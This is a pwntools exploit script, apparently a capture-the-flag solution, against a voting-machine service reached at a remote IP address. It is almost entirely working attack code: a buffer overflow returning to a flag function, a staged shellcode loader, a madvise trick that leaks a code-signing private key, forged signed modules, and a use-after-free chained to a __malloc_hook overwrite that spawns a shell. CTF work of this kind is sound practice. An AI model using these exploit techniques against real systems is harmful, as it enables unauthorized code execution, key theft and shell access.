import time
from pwn import *


context.log_level = 'debug'
context.arch = 'amd64'
context.log_console = open('/tmp/log','w')


with open('./bin/modules/ballot_module.img.sig','r') as f:
    module = f.read()

machine = ELF('./bin/machine')
libc = ELF('./bin/libc.so.6')

mod_start = module.index('488d05'.decode('hex'))
# Find printflag function
ind = module.index('bf39050000'.decode('hex')) - mod_start - 26

libc_base = 0

# First we need to crash the GUI to get access to the input of the ballot module
# We can do this by selecting a canidate twice and submitting, causing a div by 0
def init():
    #p = remote('127.0.0.1', 9000)
    #p = remote('3.83.245.54', 9000)
    p = remote('54.144.21.40', 9000)

    def up():
        p.send('1b4f41'.decode('hex'))
    def down():
        p.send('1b4f42'.decode('hex'))
    def enter():
        p.send('\n')

    p.readuntil('President')
    enter()
    enter()
    down()
    down()
    enter()

    return p

p = init()

# For the first flag, we exploit a buffer overflow in the ballot counter
# this is a simple bof, and there is a function to get the first flag
# (luckily the way the modules are compiled disabled stack cookies)
# so we replace the return with that function pointer
def flag1():
    raw_input()
    print p.readuntil('back to STDIN')

    # Initial negative length is used for the alloca
    pl = '\xff'

    # BOF the stack and return to the read flag function
    pl += 'A'*(32-8)
    pl += p64(0x0)
    pl = pl.ljust(0x58 + 1, 'A')
    pl += p64(0x500000 + ind)

    p.sendline(pl)
    p.interactive()

# The max of each ballot result will be stored one byte at a time
# To run shellcode, we build a loader in the module data section (which is rwx!)
# That shellcode will read in a larger payload over the module text
def init_shellcode():
    def write_byte(v):
        print p.readuntil('back to STDIN')
        pl = '\x01' + chr(v) + '\0'

        p.sendline(pl)


    # Set up bootstrap to read in larger payload
    sc = [
        #'int3',

        # Leak out the libc malloc address (needed for flag3 only)
        'mov r8, 0x502160', # malloc libc func
        shellcraft.amd64.linux.syscall(1,1,'r8',0x8),

        # Call function to read 0x2000 bytes of data from stdin
        'mov rax, 0x50056b',
        'mov rdi, 0x2000',
        'call rax',

        # Call memcpy to copy that data over the module text
        'mov rsi, rax', # input data
        'mov rax, 0x5002e8', # memcpy
        'mov rdi, 0x500000',
        'mov rdx, 0x2000',
        'call rax',

        #'int3',

        # Jump into the shellcode
        'jmp rax'
    ]
    sc = '\n'.join(sc)
    sc = asm(sc)

    for c in sc:
        write_byte(ord(c))

    # Trigger the same BOF as before, but return to our shellcode at 0x2020
    pl = '\xff'
    pl += 'A'*(32-8)
    pl += p64(0x0)
    pl = pl.ljust(0x58 + 1, 'A')
    pl += p64(0x500000 + 0x2020) # Results array where our shellcode is

    p.sendline(pl)


    # Here we are reading the libc leak. This is only needed for flag3
    leak = p.readuntil('\0\0') # wait for our leak
    libc_malloc = u64(leak[-8:])
    print(hex(libc_malloc))
    global libc_base
    libc_base = libc_malloc-libc.symbols['malloc']
    print('libc_base =',hex(libc_base))
    libc.address = libc_base

def trigger_shellcode(pl2):
    pl2 += '\xcc'

    if '\n' in pl2:
        print 'new line in payload'
        exit(-1)

    if len(pl2) >= 0x1800:
        print 'payload too large'
        exit(-1)

    p.readuntil('back to STDIN')
    p.sendline(pl2)

def run_shellcode(pl2):
    init_shellcode()
    trigger_shellcode(pl2)

# To move onto flag 2 we will need to leak the code signing private key
# This can be done using memadvise dontneed, which will read load the
# data section from the underlying file!
# We just need to find a pointer to the datasection which is in the ipc struct
def leak_privkey():
    raw_input()

    pl2 = [
        #'int3',

        # Grab the IPC struct stored in the module data section
        'mov rax, 0x502120',
        'mov rax, qword ptr [rax]',

        # Grab the main datasection pointer from it (points to ipc_head)
        'mov rax, qword ptr [rax+0x28]',

        # Calculate offset to page with priv key
        'sub rax, 0x200',
        'mov r8, rax',

        # Do madvise with MADV_DONTNEED on the datasection (page aligned!)
        shellcraft.linux.syscall(28, 'r8', 0x4096, 4),

        # Change pointer to point to restored private key and write to stdout
        'add r8, 0x20',
        shellcraft.amd64.linux.syscall(1,1,'r8',0x100),
    ]
    pl2 = '\n'.join(pl2)
    print(pl2)
    pl2 = asm(pl2)

    run_shellcode(pl2)

    p.interactive()

# For the second flag we need the ability to load our signed module to access 31337
# So we need a stub that will use the ipc load module from memory function (21)
# This simply takes a blob of shellcode, signs it, then sends it over ipc
def load_module_shellcode(module_asm, flags, get_ipc=None):
    # Append the flags for the module
    module = chr(flags) + module_asm

    with open('/tmp/evil.img', 'wb') as f:
        f.write(module)

    # This would be a patched version of machine with the leaked key
    os.system('./bin/machine sign /tmp/evil.img')

    with open('/tmp/evil.img.sig','rb') as f:
        evil = f.read()

    print(repr(evil))

    if (get_ipc == None):
        pl2 = [
            # Grab the IPC struct stored in the module data section
            'mov rax, 0x502120',
            'mov rax, qword ptr [rax]',

            # Grab the parent IPC FD
            'mov r8d, dword ptr [rax+0xc]',
        ]
    else:
        pl2 = get_ipc


    # Now we need to send this to ipc call 21
    pl2 += [


        # Push the ipc packet (and module data) onto the stack
        shellcraft.pushstr(p16(4+len(evil))+p32(21)+evil), # IPC for load module

        # Send up the ipc packet to start the module
        shellcraft.linux.syscall(1, 'r8', 'rsp', 6 + len(evil)),
    ]
    pl2 = '\n'.join(pl2)
    print(pl2)
    pl2 = asm(pl2)
    return pl2


# For flag two we will be using the private key we leaked to sign a module
# which calls ipc 31337 to get the second flag
def flag2():
    raw_input()

    pl2 = [
        #'int3',

        # RDX holds the ipc struct, get the parent ipc FD
        'mov r8d, [rdx+0xc]',

        # Call ipc 31337 to print the flag
        shellcraft.pushstr(p16(4)+p32(31337)),
        shellcraft.linux.syscall(1, 'r8', 'rsp', 6),

        # We don't care what happens now, we have the flag
        'int3',
    ]
    pl2 = '\n'.join(pl2)
    print(pl2)
    pl2 = asm(pl2)


    mod_sc = load_module_shellcode(pl2, 1) # 1 for privlaged
    run_shellcode(mod_sc)

    p.interactive()


# For this there is a oob in a init only ipc call
# We can't pretent to be init, so we have to force init to send a ipc call for us
# To do this we will use a UAF on the gui input client, replace it with a fake
# client with init's ipc FDs, then write to that fake client
def flag3():
    raw_input()

    # Set up the first stage shellcode so we get a libc leak
    init_shellcode()
    raw_input('continue...')

    # Fake ipc client we will UAF with
    client = ''
    # First 4 bytes are used by the ipc packet type
    client += 'AAAA' # so round off to 8
    client += p32(7) + p32(8) # ipc_to_parent
    client += p32(7) + p32(8) # ipc_to_child (actually ipc_to_parent for init)
    client += p64(0) # padding
    client += p64(0x41424344) # next
    client += p64(0x41424344) # head

    # This is the packet we send as init
    fake_ipc = '' # Note it will already prepend the length so we can skip that
    fake_ipc += p32(50) # Call ipc 50 to trigger oob

    offset = (machine.symbols['map_page'] - machine.symbols['record_array'])/8
    fake_ipc += p32(offset&0xffffffff) # Negative offset to module map pointer
    #fake_ipc += p64(0x414243444546)
    fake_ipc += p64(libc.symbols['__malloc_hook'])

    '''
    0xe585f	execve("/bin/sh", r10, [rbp-0x70])
    constraints:
      [r10] == NULL || r10 == NULL
      [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
    '''

    # Now when we map the image we can write to the pointer above
    payload = p64(0x414243444546)
    payload = p64(libc.address + 0xe585f)
    #payload = p64(libc.address + 0xe6ce6)

    # Wait until client causes UAF, then use client
    # the client will let us write our fake ipc message
    gui = [
        #'int3',

        # RDX holds the ipc struct, get the parent ipc FD
        'mov r8d, dword ptr [rdx+0xc]',

        # Sleep until the other module requests a gui read
        shellcraft.push(0),
        shellcraft.push(3),
        shellcraft.linux.syscall(35, 'rsp', 0),

        # Send the fake ipc struct as a nop ipc packet
        shellcraft.pushstr(p16(4+len(client))+p32(0)+client),
        shellcraft.linux.syscall(1, 'r8', 'rsp', 6 + len(client)),

        # Now we can use the UAF'ed FD to write to the write end of the init fd
        shellcraft.pushstr(p16(4+len(fake_ipc))+p32(10)+fake_ipc), # IPC for gui input
        shellcraft.linux.syscall(1, 'r8', 'rsp', 6 + len(fake_ipc)),

        # Sleep so we can process the other ipc message and not race
        shellcraft.push(0),
        shellcraft.push(1),
        shellcraft.linux.syscall(35, 'rsp', 0),
    ]
    gui = '\n'.join(gui)
    print(gui)
    gui = asm(gui)
    gui += load_module_shellcode(payload, 0, []) # 1 for privlaged
    gui += asm('loop: jmp loop')

    # Request a gui read, which will put its pointer in `waiting_for_input`
    # Then kill the proc so that it gets freed from the list of clients
    uaf = [
        #'int3',

        # RDX holds the ipc struct, get the parent ipc FD
        'mov r8d, dword ptr [rdx+0xc]',

        # Send an ipc request for gui input
        shellcraft.pushstr(p16(6)+p32(2)+p16(100)), # IPC call for flag2
        shellcraft.linux.syscall(1, 'r8', 'rsp', 8),
        
        # Kill this module so we can free its IPC struct
        shellcraft.linux.syscall(60),
    ]
    uaf = '\n'.join(uaf)
    print(uaf)
    uaf = asm(uaf)


    # We want to launch the gui process first, then we launch the UAF process
    #mod_sc = asm('int3')
    mod_sc = '' 
    mod_sc += load_module_shellcode(gui, 3) # 3 for privlaged + gui
    mod_sc += load_module_shellcode(uaf, 1) # 1 for privlaged

    # Keep alive so we don't free this one before the exploit
    mod_sc += asm('loop: jmp loop')

    # Run the shellcode using the stage2 loader
    trigger_shellcode(mod_sc)

    p.interactive()

#flag1()
leak_privkey()
#flag2()
#flag3()




